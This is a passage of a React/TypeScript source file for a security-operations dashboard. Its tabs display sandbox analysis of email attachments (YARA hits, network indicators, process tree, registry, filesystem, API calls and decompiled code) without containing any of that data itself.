                  <div className="neon-progress-fill" style={{ width: `${(d.entropy / 8) * 100}%`, background: d.entropy > 6.5 ? 'linear-gradient(90deg, #dc2626, #ef4444)' : 'linear-gradient(90deg, #d97706, #f59e0b)', boxShadow: `0 0 6px ${d.entropy > 6.5 ? '#ef444460' : '#f59e0b60'}` }} />
                </div>
              </div>
              <div>
                <span className="text-[9px] font-bold uppercase mb-2 block" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>YARA SIGNATURES</span>
                <div className="space-y-1">
                  {d.yara.map((y: any) => (
                    <div key={y} className="px-2 py-1 rounded text-[9px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', background: 'rgba(239,68,68,0.07)', border: '1px solid rgba(239,68,68,0.2)', color: '#f87171' }}>
                    [!] {y}
                    </div>
                  ))}
                </div>
              </div>
            </div>
            {/* Network IOCs */}
            <div className="rounded-xl p-4 space-y-3" style={{ background: 'rgba(10,18,35,0.8)', border: '1px solid rgba(30,41,59,0.6)' }}>
              <span className="text-[9px] font-bold uppercase" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>NETWORK IOCS</span>
              {d.network.map((n: any, i: number) => (
                <div key={i} className="p-2 rounded-lg" style={{ background: 'rgba(239,68,68,0.05)', border: '1px solid rgba(239,68,68,0.15)' }}>
                  <div className="flex items-center gap-1.5 mb-0.5">
                    <span className="text-[9px] font-bold px-1 py-0.5 rounded" style={{ fontFamily: 'JetBrains Mono, monospace', ...FLAG_STYLES[n.flag as keyof typeof FLAG_STYLES] }}>{n.flag}</span>
                    <span className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>{n.proto}:{n.port}</span>
                  </div>
                  <code className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#fca5a5' }}>{n.host}</code>
                  <div className="text-[9px]" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#334155' }}>{n.ip}</div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* PROCESS TREE */}
        {tab === 'process' && (
          <div className="animate-fade-in space-y-2">
            <div className="flex items-center gap-2 mb-3">
              <GitBranch className="w-4 h-4 text-cyan-400" />
              <span className="text-[11px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#e2e8f0' }}>PROCESS TREE — spawned during static detonation</span>
            </div>
            <PTree node={d.process_tree} />
          </div>
        )}

        {/* NETWORK */}
        {tab === 'network' && (
          <div className="animate-fade-in">
            <table className="w-full text-[10px]" style={{ fontFamily: 'JetBrains Mono, monospace', borderCollapse: 'collapse' }}>
              <thead>
                <tr style={{ borderBottom: '1px solid rgba(30,41,59,0.8)' }}>
                  {['TIME', 'FLAG', 'PROTO', 'DIR', 'HOST', 'IP', 'PORT', 'BYTES'].map(h => (
                    <th key={h} className="px-3 py-2 text-left text-[9px] font-bold" style={{ color: '#334155' }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {d.network.map((n: any, i: number) => (
                  <tr key={i} className="transition-colors" style={{ borderBottom: '1px solid rgba(30,41,59,0.4)', background: i % 2 === 0 ? 'rgba(10,18,35,0.4)' : 'transparent' }}>
                    <td className="px-3 py-2 text-slate-500">{n.t}</td>
                    <td className="px-3 py-2">
                      <span className="px-1.5 py-0.5 rounded text-[9px] font-bold" style={FLAG_STYLES[n.flag as keyof typeof FLAG_STYLES]}>{n.flag}</span>
                    </td>
                    <td className="px-3 py-2 text-slate-400">{n.proto}</td>
                    <td className="px-3 py-2" style={{ color: n.dir === 'OUT' ? '#f59e0b' : '#10b981' }}>{n.dir}</td>
                    <td className="px-3 py-2 text-red-300">{n.host}</td>
                    <td className="px-3 py-2 text-slate-400">{n.ip}</td>
                    <td className="px-3 py-2 text-slate-500">{n.port}</td>
                    <td className="px-3 py-2 text-slate-500">{n.bytes.toLocaleString()}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* REGISTRY */}
        {tab === 'registry' && (
          <div className="space-y-2 animate-fade-in">
            {d.registry.map((r: any, i: number) => (
              <div key={i} className="p-3 rounded-xl flex items-start gap-3"
                   style={{ background: r.risk ? 'rgba(239,68,68,0.06)' : 'rgba(10,18,35,0.6)', border: `1px solid ${r.risk ? 'rgba(239,68,68,0.2)' : 'rgba(30,41,59,0.5)'}` }}>
                <span className="text-[9px] font-bold px-1.5 py-0.5 rounded shrink-0"
                      style={{ fontFamily: 'JetBrains Mono, monospace', background: r.op === 'WRITE' ? 'rgba(245,158,11,0.1)' : r.op === 'CREATE' ? 'rgba(6,182,212,0.1)' : 'rgba(239,68,68,0.1)', color: r.op === 'WRITE' ? '#fcd34d' : r.op === 'CREATE' ? '#67e8f9' : '#fca5a5', border: `1px solid ${r.op === 'WRITE' ? 'rgba(245,158,11,0.25)' : r.op === 'CREATE' ? 'rgba(6,182,212,0.25)' : 'rgba(239,68,68,0.25)'}` }}>
                  {r.op}
                </span>
                <div className="min-w-0">
                  <code className="text-[10px] break-all" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#c084fc' }}>{r.key}</code>
                  <div className="text-[10px] mt-0.5" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#64748b' }}>{r.value}</div>
                </div>
                {r.risk && <span className="shrink-0 text-[9px] font-bold" style={{ color: '#ef4444' }}>RISK</span>}
              </div>
            ))}
          </div>
        )}

        {/* FILESYSTEM */}
        {tab === 'fs' && (
          <div className="space-y-2 animate-fade-in">
            {d.filesystem.map((f: any, i: number) => (
              <div key={i} className="p-3 rounded-xl flex items-center gap-3"
                   style={{ background: f.risk ? 'rgba(239,68,68,0.05)' : 'rgba(10,18,35,0.6)', border: `1px solid ${f.risk ? 'rgba(239,68,68,0.2)' : 'rgba(30,41,59,0.5)'}` }}>
                <span className="text-[9px] font-bold px-1.5 py-0.5 rounded shrink-0"
                      style={{ fontFamily: 'JetBrains Mono, monospace', background: f.op === 'EXEC' ? 'rgba(239,68,68,0.12)' : f.op === 'CREATE' ? 'rgba(6,182,212,0.08)' : f.op === 'WRITE' ? 'rgba(245,158,11,0.08)' : 'rgba(168,85,247,0.08)', color: f.op === 'EXEC' ? '#fca5a5' : f.op === 'CREATE' ? '#67e8f9' : f.op === 'WRITE' ? '#fcd34d' : '#d8b4fe', border: `1px solid ${f.op === 'EXEC' ? 'rgba(239,68,68,0.3)' : f.op === 'CREATE' ? 'rgba(6,182,212,0.25)' : f.op === 'WRITE' ? 'rgba(245,158,11,0.25)' : 'rgba(168,85,247,0.25)'}` }}>
                  {f.op}
                </span>
                <code className="flex-1 text-[10px] break-all" style={{ fontFamily: 'JetBrains Mono, monospace', color: f.risk ? '#fca5a5' : '#64748b' }}>{f.path}</code>
                {f.risk && <span className="shrink-0 text-[9px] font-bold" style={{ color: '#ef4444' }}>!</span>}
              </div>
            ))}
          </div>
        )}

        {/* API CALLS */}
        {tab === 'api' && (
          <div className="animate-fade-in overflow-x-auto">
            <table className="w-full text-[10px]" style={{ fontFamily: 'JetBrains Mono, monospace', borderCollapse: 'collapse' }}>
              <thead>
                <tr style={{ borderBottom: '1px solid rgba(30,41,59,0.8)' }}>
                  {['TIME', 'API FUNCTION', 'ARGUMENTS', 'RETURN', ''].map(h => (
                    <th key={h} className="px-3 py-2 text-left text-[9px] font-bold" style={{ color: '#334155' }}>{h}</th>
                  ))}
                </tr>
              </thead>
              <tbody>
                {d.api_calls.map((a: any, i: number) => (
                  <tr key={i} style={{ borderBottom: '1px solid rgba(30,41,59,0.3)', background: a.risk ? 'rgba(239,68,68,0.04)' : 'transparent' }}>
                    <td className="px-3 py-2 text-slate-500">{a.ts}</td>
                    <td className="px-3 py-2 font-bold" style={{ color: a.risk ? '#fca5a5' : '#67e8f9' }}>{a.fn}</td>
                    <td className="px-3 py-2 text-slate-500 max-w-xs truncate">{a.args}</td>
                    <td className="px-3 py-2" style={{ color: a.ret.includes('SUCCESS') || a.ret === 'S_OK' ? '#10b981' : '#94a3b8' }}>{a.ret}</td>
                    <td className="px-3 py-2">{a.risk && <span className="text-[9px] font-bold text-red-400">RISK</span>}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {/* DECOMPILED */}
        {tab === 'code' && (
          <div className="animate-fade-in">
            <TypingTerminal lines={d.decompiled} />
          </div>
        )}
      </div>
    </div>
  );
};

// ─── Main View ────────────────────────────────────────────────────────────────
export const AttachmentSandboxView: React.FC<AttachmentSandboxViewProps> = ({ caseDetail }) => {
  const attachments = caseDetail.attachments.length > 0 ? caseDetail.attachments : DEMO_ATTACHMENTS;

  return (
    <div className="space-y-6 p-6 animate-fade-in">
      {/* Header */}
      <div className="relative rounded-xl p-5 overflow-hidden" style={{ background: 'linear-gradient(135deg, rgba(239,68,68,0.06) 0%, rgba(168,85,247,0.04) 50%, rgba(10,18,35,0.96) 100%)', border: '1px solid rgba(239,68,68,0.2)' }}>
        <div className="absolute top-0 right-0 w-48 h-48 opacity-10 rounded-full" style={{ background: 'radial-gradient(circle, #ef4444, transparent)', filter: 'blur(40px)' }} />
        <div className="relative flex flex-col sm:flex-row sm:items-center sm:justify-between gap-4">
          <div className="flex items-center gap-3">
            <div className="w-10 h-10 rounded-xl flex items-center justify-center" style={{ background: 'rgba(239,68,68,0.1)', border: '1px solid rgba(239,68,68,0.3)', boxShadow: '0 0 16px rgba(239,68,68,0.15)' }}>
              <Cpu className="w-5 h-5" style={{ color: '#f87171' }} />
            </div>
            <div>
              <h2 className="text-base font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#f1f5f9' }}>STATIC DETONATION SANDBOX</h2>
              <p className="text-[11px] mt-0.5" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>Process tree · Network capture · Registry/FS activity · API calls · MITRE ATT&CK mapping · <span style={{ color: '#f87171' }}>SOC & INVESTIGATOR only</span></p>
            </div>
          </div>
          <div className="flex items-center gap-2 flex-wrap">
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg" style={{ background: 'rgba(239,68,68,0.08)', border: '1px solid rgba(239,68,68,0.3)' }}>
              <div className="status-led status-led-red" />
              <span className="text-[10px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#f87171' }}>ISOLATED · NO EXECUTION</span>
            </div>
            <div className="flex items-center gap-2 px-3 py-1.5 rounded-lg" style={{ background: 'rgba(168,85,247,0.06)', border: '1px solid rgba(168,85,247,0.2)' }}>
              <Crosshair className="w-3 h-3" style={{ color: '#a855f7' }} />
              <span className="text-[10px] font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#a855f7' }}>MITRE ATT&CK MAPPED</span>
            </div>
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3">
        {[
          { l: 'SAMPLES',        v: attachments.length, c: '#d946ef', bg: 'rgba(217,70,239,0.06)', b: 'rgba(217,70,239,0.2)' },
          { l: 'MALWARE VERDICT',v: attachments.filter(a => a.risk_level === 'HIGH').length, c: '#ef4444', bg: 'rgba(239,68,68,0.06)', b: 'rgba(239,68,68,0.2)' },
          { l: 'MITRE TECHNIQUES',v: 12, c: '#a855f7', bg: 'rgba(168,85,247,0.06)', b: 'rgba(168,85,247,0.2)' },
          { l: 'NETWORK IOCS',   v: 8,  c: '#f59e0b', bg: 'rgba(245,158,11,0.06)', b: 'rgba(245,158,11,0.2)' },
        ].map(({ l, v, c, bg, b }) => (
          <div key={l} className="rounded-xl p-3" style={{ background: bg, border: `1px solid ${b}` }}>
            <div className="text-[9px] font-bold mb-1" style={{ fontFamily: 'JetBrains Mono, monospace', color: '#475569' }}>{l}</div>
            <div className="text-2xl font-bold" style={{ fontFamily: 'JetBrains Mono, monospace', color: c }}>{v}</div>
          </div>
        ))}
      </div>

      {attachments.map((att, idx) => (
        <SandboxCard key={att.attachment_id} att={att} caseId={caseDetail.case_id} idx={idx} />
      ))}
    </div>
  );
};

